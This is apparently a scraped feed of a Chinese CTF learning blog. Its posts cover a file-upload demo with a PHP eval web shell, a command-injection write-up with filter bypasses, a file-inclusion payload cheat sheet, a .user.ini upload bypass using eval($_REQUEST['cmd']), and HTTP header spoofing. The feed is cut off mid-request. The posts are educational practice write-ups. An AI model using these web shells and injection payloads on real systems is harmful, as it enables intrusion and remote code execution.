⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣧⣤⣴⠿⠿⣷⣤⡤⠴⠖⠳⣄⣀⣹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣀⣟⠻⢦⣀⡀⠀⠀⠀⠀⣀⡈⠻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠉⡇⠀⠀⠛⠛⠛⠋⠉⠉⠀⠀⠀⠹⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠈⠑⠪⠷⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀ # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣦⣼⠛⢦⣤⣄⡀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠑⠢⡀⠀⠀⠀⠀⠀ # ⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠲⠖⠛⠻⣿⡿⠛⠉⠉⠻⠷⣦⣽⠿⠿⠒⠚⠋⠉⠁⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⠀⠀⠀⠀ # ⠀⠀⠀⠀⠀⢀⣾⠛⠁⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢣⠀⠀⠀ # ⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⠀⠀ # ⠀⠀⠀⣰⣿⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣧⣄⠀⠀⠀⠀⠀⠀⢳⡀⠀ # ⠀⠀⠀⣿⡾⢿⣀⢀⣀⣦⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⣫⣿⡿⠟⠻⠶⠀⠀⠀⠀⠀⢳⠀ # ⠀⠀⢀⣿⣧⡾⣿⣿⣿⣿⣿⡷⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⢀⡴⢿⣿⣧⠀⡀⠀⢀⣀⣀⢒⣤⣶⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇ # ⠀⠀⡾⠁⠙⣿⡈⠉⠙⣿⣿⣷⣬⡛⢿⣶⣶⣴⣶⣶⣶⣤⣤⠤⠾⣿⣿⣿⡿⠿⣿⠿⢿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇ # ⠀⣸⠃⠀⠀⢸⠃⠀⠀⢸⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⠟⡉⠀⠀⠀⠈⠙⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇ # ⠀⣿⠀⠀⢀⡏⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⠛⠉⠁⠀⠀⠀⠀⠀⠉⠠⠿⠟⠻⠟⠋⠉⢿⣿⣦⡀⢰⡀⠀⠀⠀⠀⠀⠀⠁ # ⢀⣿⡆⢀⡾⠀⠀⠀⠀⣾⠏⢿⣿⣿⣿⣯⣙⢷⡄⠀⠀⠀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣻⢿⣷⣀⣷⣄⠀⠀⠀⠀⢸⠀ # ⢸⠃⠠⣼⠃⠀⠀⣠⣾⡟⠀⠈⢿⣿⡿⠿⣿⣿⡿⠿⠿⠿⠷⣄⠈⠿⠛⠻⠶⢶⣄⣀⣀⡠⠈⢛⡿⠃⠈⢿⣿⣿⡿⠀⠀⠀⠀⠀⡀ # ⠟⠀⠀⢻⣶⣶⣾⣿⡟⠁⠀⠀⢸⣿⢅⠀⠈⣿⡇⠀⠀⠀⠀⠀⣷⠂⠀⠀⠀⠀⠐⠋⠉⠉⠀⢸⠁⠀⠀⠀⢻⣿⠛⠀⠀⠀⠀⢀⠇ # ⠀⠀⠀⠀⠹⣿⣿⠋⠀⠀⠀⠀⢸⣧⠀⠰⡀⢸⣷⣤⣤⡄⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡆⠀⠀⠀⠀⡾⠀⠀⠀⠀⠀⠀⢼⡇ # ⠀⠀⠀⠀⠀⠙⢻⠄⠀⠀⠀⠀⣿⠉⠀⠀⠈⠓⢯⡉⠉⠉⢱⣶⠏⠙⠛⠚⠁⠀⠀⠀⠀⠀⣼⠇⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⡇ # ⠀⠀⠀⠀⠀⠀⠻⠄⠀⠀⠀⢀⣿⠀⢠⡄⠀⠀⠀⣁⠁⡀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⢀⣐⡟⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢠⡇ ","date":"2023-10-19T13:23:41+08:00","permalink":"https://66lueflam144.github.io/p/75c328f/","title":"Tbc"},{"content":"begin 写了file upload的短分享ppt然后得到自己可以写一个demo的问题，于是开始。\n在得到demotest这个可以使用的本地网站之前经历了一场405风暴。\n源代码 首先先写了网页代码，index.html和upload.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 index.html \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;demo2\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;upload_file.php\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;file\u0026#34;\u0026gt;文件名：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;file\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;提交\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 upload.php \u0026lt;?php // 允许上传的图片后缀 $allowedExts = array(\u0026#34;gif\u0026#34;, \u0026#34;jpeg\u0026#34;, \u0026#34;jpg\u0026#34;, \u0026#34;png\u0026#34;,\u0026#34;php\u0026#34;); $temp = explode(\u0026#34;.\u0026#34;, $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); echo $_FILES[\u0026#34;file\u0026#34;][\u0026#34;size\u0026#34;]; $extension = end($temp); // 获取文件后缀名 if ((($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/gif\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/jpeg\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/jpg\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/pjpeg\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/x-png\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/png\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;application/octet-stream\u0026#34;)) \u0026amp;\u0026amp; ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;size\u0026#34;] \u0026lt; 204800) // 小于 200 kb \u0026amp;\u0026amp; in_array($extension, $allowedExts)) { if ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;error\u0026#34;] \u0026gt; 0) { echo \u0026#34;错误：: \u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;error\u0026#34;] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { echo \u0026#34;上传文件名: \u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;文件类型: \u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;文件大小: \u0026#34; . ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;size\u0026#34;] / 1024) . \u0026#34; kB\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;文件临时存储的位置: \u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; // 判断当期目录下的 upload 目录是否存在该文件 // 如果没有 upload 目录，你需要创建它，upload 目录权限为 777 if (file_exists(\u0026#34;upload/\u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;])) { echo $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;] . \u0026#34; 文件已经存在。 \u0026#34;; } else { // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下 move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], \u0026#34;upload/\u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); echo \u0026#34;文件存储在: \u0026#34; . \u0026#34;upload/\u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; } } } else { echo \u0026#34;非法的文件格式\u0026#34;; } ?\u0026gt; php代码是有限制的（网上找的所以只是简单修改了限制条件）\n405 Method not allowed 然后我就GoLive\n一切都很美好，然后上传文件\n无论是什么文件都是405，405，405\u0026hellip;\n抓耳挠腮到处找\n最后burp suite抓包获得Response\n1 2 3 4 5 6 7 8 ... Access-Control-Allow-Credentials:true Allow:GET.HEAD,OPTIONS ... 可能是edge web server的限制吧——添加js、修改为Flask无果。于是通过phpstudy建立本地网站。\n建立网站，写好域名，选好根目录之后，把index.html和upload.php移入根目录中，打开网站运行成功，上传功能正常，可喜可贺，感天动地。\nUpload Method=GET file 上传ing and test 上传一个get2.php文件，内容为\n1 2 \u0026lt;? php eval($_GET[1]); ?\u0026gt; 与之前写的一句话木马都不一样，\n这次使用的是GET方法\n去除了eval()前面的@符号，不然看不到任何回显\n上传成功之后回显文件上传到了upload/，我们通过eval()函数的原理，对1`进行赋值（替换）\n1 2 http://example.com/upload/get2.php?1=phpinfo(); 就会看到phpinfo——说明上传成功也能被正确解析执行。\n之前写的是GET['shell']，进行替换的时候被错误解析无法执行，报错Parse error:syntax error, unexpected end of file:\u0026hellip;.:get2.php(1):eval()\u0026rsquo;d code on line 1,因为对shell进行赋值都是GET['xxx']，会被当作是字符执行。\n测试通过之后，进行输出目录。\ndir 因为搭建网站的环境是windows，所以使用dir命令来输出目录，如果是linux就用ls。\n查询dir官方文档之后，构建：\n1 2 http://example.com/upload/get2.php?1=system(%27dir%20/b/s/w/o/p%27); 界面就回显了一排整齐的文件的所在地址\n接下来还可以通过其他命令进入这些文件里面进行一些操作。\n","date":"2023-10-17T18:26:52+08:00","permalink":"https://66lueflam144.github.io/p/c659435/","title":"文件上传 Get"},{"content":"1 （1） 打开靶场，扑面而来一个\n/?ip=\n（如果有点觉悟就会想起来之前做的文件上传从而意识到这是个URL地址符提示。不过当时没有，甚至在想这是什么代码……php？html？）\n于是熟练的打开edge查询wp。\n于是\n1 2 http://2993ad62-21c8-4f1d-b4d6-05bdd7130b70.node4.buuoj.cn:81/?ip=127.0.0.1;ls 喜提\n(补充：尝试了一下\u0026amp;\u0026amp; ls，什么有用的也没有得到)\n1 2 3 4 5 6 PING 127.0.0.1 (127.0.0.1): 56 data bytes flag.php index.php 这告诉我们有两个php文件，名字如上。\n（2） 再用cat命令\n1 2 /?ip=xxx;cat flag.php 喜提fuck your space。\n好嘛，用能想到的space替换符，%20之类的，毫不意外不行。\nwp提供了更多的绕过space：\n1 2 3 4 5 6 7 8 9 10 ${IFS} $IFS$1 ${IFS \u0026lt;\u0026gt; or \u0026lt; 重定向符替换 %09 原博一个个试后告诉大家，$IFS$1行得通。\n1 2 https://xxx/?ip=127.0.0.1;cat$IFS$1flag.php 又告诉你不行——因为flag被过滤了。\n（3） 试一下index.php，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 PING 127.0.0.1 (127.0.0.1): 56 data bytes /?ip= |\\\u0026#39;|\\\u0026#34;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\u0026#34;, $ip, $match)){ echo preg_match(\u0026#34;/\\\u0026amp;|\\/|\\?|\\*|\\\u0026lt;|[\\x{00}-\\x{20}]|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\u0026#34;, $ip, $match); die(\u0026#34;fxck your symbol!\u0026#34;); } else if(preg_match(\u0026#34;/ /\u0026#34;, $ip)){ die(\u0026#34;fxck your space!\u0026#34;); } else if(preg_match(\u0026#34;/bash/\u0026#34;, $ip)){ die(\u0026#34;fxck your bash!\u0026#34;); } else if(preg_match(\u0026#34;/.*f.*l.*a.*g.*/\u0026#34;, $ip)){ die(\u0026#34;fxck your flag!\u0026#34;); } $a = shell_exec(\u0026#34;ping -c 4 \u0026#34;.$ip); echo \u0026#34; \u0026#34;; print_r($a); } ?\u0026gt; 解释一下就是：\nPING 127.0.0.1 (127.0.0.1): 56 data bytes：这是一个命令行输出，表示将对IP地址 127.0.0.1 进行Ping测试。/?ip=：这是一个URL参数，用于接收要测试的目标IP地址。 |\\'|\\\u0026quot;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\u0026quot;, $ip, $match))：这是一个正则表达式，用于检查输入的IP地址是否包含特定的符号（ ', \u0026quot;, \\, (, ), [, ], {, }）。然后 echo preg_match(\u0026quot;/\\\u0026amp;|\\/|\\?|\\*|\\\u0026lt;|[\\x{00}-\\x{20}]|\\\u0026gt;|\\'|\\\u0026quot;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\u0026quot;, $ip, $match);：这一行判断输入的IP地址是否包含特殊字符，并输出匹配结果。最后die(\u0026quot;fxck your symbol!\u0026quot;);：如果前面的正则表达式匹配到特殊字符，将输出错误信息并终止程序运行。 preg_match(\u0026quot;/ /\u0026quot;, $ip)：这是一个正则表达式，用于检查输入的IP地址是否包含空格。然后die(\u0026quot;fxck your space!\u0026quot;);：如果输入的IP地址包含空格，将输出错误信息并终止程序运行。后面都一样就不重复了。 $a = shell_exec(\u0026quot;ping -c 4 \u0026quot;.$ip);：执行Ping命令，通过shell_exec函数在操作系统中运行命令，并将结果存储在变量$a中。 5.print_r($a);：打印Ping命令的结果，显示Ping测试的输出信息。\n（4） 看完这么多过滤，基本可以确定没什么常规的可以写了。\n于是一个有趣的就来了：\n改变变量值\n有一个变量$a，原本的值是第4条说的，我们进行人为修改（它也没禁止）：\n1 2 https://xxx/?ip=xxxx;a=g;cat$IFS$1fla$a.php 解释一下就是：\n1 2 3 4 a=g flag=fla$a 不懂的永别了.jpg\n然后就变成了初始界面。很懵逼是吧。\n查看页面源代码获得惊喜。至于为什么会这样待我研究一下再来写。\n","date":"2023-10-17T18:22:57+08:00","permalink":"https://66lueflam144.github.io/p/a3176b7/","title":"Ping Ping Ping"},{"content":"文件包含漏洞 PHP version\n包含函数 include\nrequire\ninclude_once\nrequire_once\ninclude 将指定的文件载入并执行里面的程序。重复引用的情况下加载多次。\n1 2 3 4 5 6 7 8 \u0026lt;?php include \u0026#34;test.php\u0026#34;; include \u0026#34;test.php\u0026#34;; ?\u0026gt; 包含两次test.php。\ninclude_once 将指定文件载入并执行内含程序。不会重复包含。\n1 2 3 4 5 6 7 8 \u0026lt;?php include \u0026#34;test.php\u0026#34;; include \u0026#34;test.php\u0026#34;; ?\u0026gt; 包含一次test.php。\nrequire 除了处理错误的方式不同外，其他方面相同。同时require()一般放在 PHP 文件的最前面，程序在执行前就会先导入要引用的文件；include()一般放在程序的流程控制中，当程序执行时碰到才会引用，简化程序的执行流程\nrequire生成致命错误(E_COMPILE_ERROE)，脚本停止。\ninclude生成警告(E_WARNING)，脚本继续。\nrequire_once()也类似。\n封装协议 |协议|作用|\n|\u0026mdash;|\u0026mdash;|\n|file://|访问本地文件系统|\n|http(s)||\n|ftp://|访问FTP(s) URL|\n|php://|访问各个输入/出流|\n|zlib://|压缩流|\n|data://|数据|\n|phar://|PHP归档|\n\u0026hellip;\n伪协议 file://\n条件： allow_url_fopen:off/on\nallow_url_include:off/on\n作用 用于访问本地文件系统。include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。\nusage 绝对路径 http://xxx/include.php?file=file://C:\\WWW\\test\\1.txt\n相对路径 http://xxx/include.php?file=./2.txt\n网络路径 http://xxx/include.php?file=http://yyy/3.txt\nphp://\n条件： allow_url_fopen:off/on\nallow_url_include:仅php://input, php://stdin, php://memory, php://temp需要on\n作用 php:// 访问各个输入/输出流（I/O streams） - 在CTF中经常使用的是php://filter和\n- php://input，php://filter用于读取源码，\n- php://input用于执行php代码。\nphp://filter\n作用 一种元封装器，设计用于数据流打开时的筛选过滤应用。对于如readfile()，file()，fiel_get_contents()等一体式的文件函数非常有用，在数据流内容读取之前没有机会应用其他过滤器。\n参数\u0026amp;过滤器 参数：\nresource=： 必须项，指定了需要筛选过滤的数据流。\nread-: 可选项，设定一个或多个过滤器名称，以管道符(*\\*)分隔。\nwrite=: 可选，设定一个或多个过滤器名称，以管道符(\\)分隔。\n;：任何没有以read=或者write=做前缀的筛选器列表会视情况应用于读或写链。\n过滤器\n字符过滤器 |过滤器名称|作用|\n|\u0026mdash;|\u0026mdash;|\n|string.rot13|=str_rot13()，rot13变换|\n|string.toupper|=strtoupper，转大写字母|\n|string.tolower|strtolower()，转小写|\n|string.strip_tags|strip_tags()，去除html、PHP语言标签|\n转换过滤器 |过滤器名称|作用|\n|\u0026mdash;|\u0026mdash;|\n|convert.base64-encode \u0026amp; convert.base64-decode|=base64_encode()/base64_decode()，base64编码/解码|\n|convert.quoted-printable-encode \u0026amp; convert.quoted-printable-decode|quoted-printable字符串与8-bit字符串编码/解码|\n压缩过滤器 |过滤器名称|作用|\n|\u0026mdash;|\u0026mdash;|\n|zlib.deflate \u0026amp; zlib.inflate|在本地文件系统中创建gzip兼容文件的方法，但不产生命令行工具，只是压缩和解压数据流中的有效载荷部分|\n|bzip2.compress \u0026amp; bzip2.decompress|在本地文件系统中创建bz2兼容文件方法|\n加密过滤器 |过滤器名称|作用|\n|\u0026mdash;|\u0026mdash;|\n|mcrypt.*|libmcrypt 对称加密算法|\n|mdecrypt.*|libmcrypt 对称解密算法|\n示例 php://filter 1.读取文件源码（对php文件需要base64编码）\n1 2 http://xxx/include.php?filr=php://filter/read=covert.base64-encode/resource=xxx 2.执行php代码（结合post data）\n1 2 3 4 5 6 http://xxx/include.php?file=php://input 使用hackbar或者其他的进行post data的输入 [post data]一般是php代码，一句话木马version zip://、bzip2://、zlib:// 访问压缩文件中的子文件，不需要指定后缀名，也可以随意修改后缀名。\n1.压缩文件且修改后缀then上传\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 http://xxx/include.php?file=zip://E:\\WWW\\phpinfo.jpg%23phpinfo.txt 压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传 http://xxx/include.php?file=compress.bzip2://E:\\WWW\\phpinfo.bz2 压缩 phpinfo.txt 为 phpinfo.bz2 并上传 http://xxx/include.php?file=compress.zlib://E:\\WWW\\phpinfo.gz 压缩 phpinfo.txt 为 phpinfo.gz 并上传 data:// 1 2 3 4 5 6 7 8 9 10 http://xxx/include.php?file=data://text/plain,\u0026lt;?php%20phpinfo();?\u0026gt; \u0026lt;yyy\u0026gt;内容可以替换为其他php木马 http://xxx/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 过滤绕过 (LFI version) 1.%00截断(RFI \u0026amp; LFI) 在低版本中php读取文件名时认为%00是终止符，对于%00后面的内容就会失效。\n2.路径长度截断 Windows下目录最大长度为256字节，超出的部分会被丢弃；\nLinux下目录最大长度为4096字节，超出的部分会被丢弃。\n3.点号截断 windows系统点号长于256，超出的部分会被丢弃；\nlinux系统点号长于4096，超出的部分会被丢弃；\n4.双写绕过 举例：\npphhpp://input\n5.大小写混合绕过 举例：\nPhp://input\n6.伪协议绕过 前面说的那些\n(RFI version) 问号绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 1.txt content: \u0026lt;?php phpinfo();?\u0026gt; 在远端服务器网站目录中 访问时出现1.txt.php报错，所以修改访问URL为http://xxx/1.txt? 就会执行内容php代码 后面几个也都是在文件末尾添加\n%23绕过 参考 PHP伪协议总结\n","date":"2023-10-17T13:08:52+08:00","permalink":"https://66lueflam144.github.io/p/64b97cd/","title":"文件包含"},{"content":"1 常规步骤之后，上传了.htaccess文件，不过发现被限制了。\n返回了一个：\n1 2 exif_imagetype:not image! exif_imagetype函数\n简单来说就是，上传文件白名单机制。\nQAQ\n新英雄登场\n.user.ini文件\nphp目录配置文件，作用为：\n当我们访问目录中的任何php文件时，都会调用.user.ini中指的文件以php的形式进行读取。\n文件内容为\n1 2 3 4 GIF89a auto_prepend_file=po.jpg 之后就可以常规步骤一顿操作。\n2 这里也有了新一种方法用传进去的cmd 进行rce——其前提是传入的木马文件内容为：\n1 2 3 4 GIF89a \u0026lt;script language=\u0026#39;php\u0026#39;\u0026gt;eval($_REQUEST[\u0026#39;cmd\u0026#39;]);\u0026lt;/script\u0026gt; 然后\n1 2 3 4 5 6 7 8 9 10 uploads/xxx/index.php?cmd=var_dump(scandir(\u0026#34;/\u0026#34;)); // 扫描当前目录下的文件，并打印出来 uploads/xxx/index.php?cmd=system(\u0026#39;cat /flag\u0026#39;); uploads/xxx/index.php?cmd=var_dump(file_get_contents(\u0026#34;/flag\u0026#34;)); 3 ps：图片文件头前缀（作用是？）\n1 2 3 4 5 6 7 8 JPG:FF D8 FF E0 00 10 4A 46 49 46（16进制编码） GIF：47 49 46 38 39 61（ascll值是GIF89a） PNG： 89 50 4E 47 参考一下\n常见文件头/尾总结\nphp解析文件值得关注\n2024：现在看起来好肤浅的笔记……\n","date":"2023-10-17T13:06:03+08:00","permalink":"https://66lueflam144.github.io/p/b92f36b/","title":"Checkin"},{"content":"OMG\u0026hellip;居然是败给了一个POST\u0026amp;GET\n1 感觉和之前做过的一个题目很像，可能出自同一个出题人之手。\n按照要求进行GET传参后，需要进行POST传参。\n于是我就在这里出现了问题。\n我直接使用burp suite的repeater里面的change request method，请求头也从\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 GET /?ctf=1 HTTP/1.1 Host: node4.buuoj.cn:27986 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: ja,zh-CN;q=0.9,zh;q=0.8 Cookie: power=hacker Connection: close 变成\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 POST / HTTP/1.1 Host: node4.buuoj.cn:27986 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: ja,zh-CN;q=0.9,zh;q=0.8 Cookie: power=hacker Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 5 ctf=1 然后我把最后的ctf=1换成在Response界面找到的secret=n3wst4rCTF2023g00000d（解码后）\nbe like\n1 2 3 4 5 6 7 8 POST / HTTP/1.1 ... secret=n3wst4rCTF2023g00000d 结果就是毫无反应。。。\n修改为\n1 2 3 4 5 6 7 8 POST /?ctf=1 HTTP/1.1 ... secret=n3wst4rCTF2023g00000d 跳转成功。。。\nPOST请求是HTTP协议中的一种方法，用于将数据发送到服务器以创建或修改资源。\n这两个请求的主要区别在于URL路径部分。\nPOST /?ctf=1 HTTP/1.1：这个请求将数据通过POST方法发送到服务器，并且附带了查询参数ctf=1。查询参数是通过URL的?符号后跟随的键值对形式的参数，用于向服务器传递额外的信息。 例如：http://example.com/?ctf=1\nPOST / HTTP/1.1：这个请求将数据通过POST方法发送到服务器，但没有附带任何查询参数。请求的URL路径只是根路径/，没有其他路径或参数信息。 例如：http://example.com/\n然后我一直在那里POST /\u0026hellip;.好心寒 2 cookie 之后就是修改cookie。\n如果你和我一样穷凶极恶（bushi）的扒拉请求头看的话就会非常清楚的记得一个name=power，value=hacker的cookie。\n尝试用cookie editor但是修改失败（不知道什么原因）所以继续用burp suite，将power=hacker修改为power=ctfer即可。\n接着是指定浏览器。\n指定浏览器 User-Agent 首部包含了一个特征字符串，用来让网络协议的对端来识别发起请求的用户代理软件的应用类型、操作系统、软件开发商以及版本号。\n浏览器通常使用的格式为：\n1 2 User-Agent: Mozilla/\u0026lt;version\u0026gt; (\u0026lt;system-information\u0026gt;) \u0026lt;platform\u0026gt; (\u0026lt;platform-details\u0026gt;) \u0026lt;extensions\u0026gt; 原请求头中\n1 2 3 4 5 6 7 8 POST /?ctf=1 HTTP/1.1 ... User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36 ... 1.客户端类型：这个 User-Agent 字符串包含字符串 \u0026ldquo;Mozilla\u0026rdquo;，因为早期的 Netscape Navigator 浏览器是使用 Mozilla 代码库开发的。大多数现代浏览器仍然包含这个字符串，用于向服务器表明其兼容性以及其实际的应用程序类型。\n2.操作系统(system-information)：这个 User-Agent 字符串指定了客户端正在运行的操作系统，它的值为 \u0026ldquo;Windows NT 10.0\u0026rdquo;，表示该客户端正运行在 Windows 10 操作系统上。架构(platform)：这个 User-Agent 字符串包含 \u0026ldquo;Win64\u0026rdquo;，说明客户端操作系统是 Windows 64 位系统。\n3.软件版本(extensions)：这个 User-Agent 字符串还包含 Chrome 浏览器和 Safari 浏览器的版本信息。\u0026ldquo;Chrome/110.0.5481.78\u0026rdquo; 表示请求使用的 Chrome 浏览器版本为 110.0.5481.78，而 \u0026ldquo;Safari/537.36\u0026rdquo; 则表示 Safari 浏览器的版本号为 537.36。\n我们按照要求直接把User-Agent字段全改为NewStarCTF2023，界面跳转，从newstarctf.com查找。\nReferer 该请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer 请求头识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等。\n接着按要求增加Referer:newstarctf.com\n本地用户 X-Real-IP:记录服务器的地址并且直接替换。X-Real-IP 通常被 HTTP 代理用来表示与它产生 TCP 连接的设备 IP，这个设备可能是其他代理，也可能是真正的请求端。需要注意的是，X-Real-IP 目前并不属于任何标准，代理和 Web 应用之间可以约定用任何自定义头来传递这个信息。\n参考（X-Forwarded-For \u0026amp; X-Real—IP）\n本地用户-\u0026gt;通用的IP-\u0026gt;127.0.0.1\n好的，又添加\n1 2 X-Real-IP:127.0.0.1 结果 最后请求be like：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 POST /?ctf=1 HTTP/1.1 Host: node4.buuoj.cn:27986 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: NewStarCTF2023 Accept: 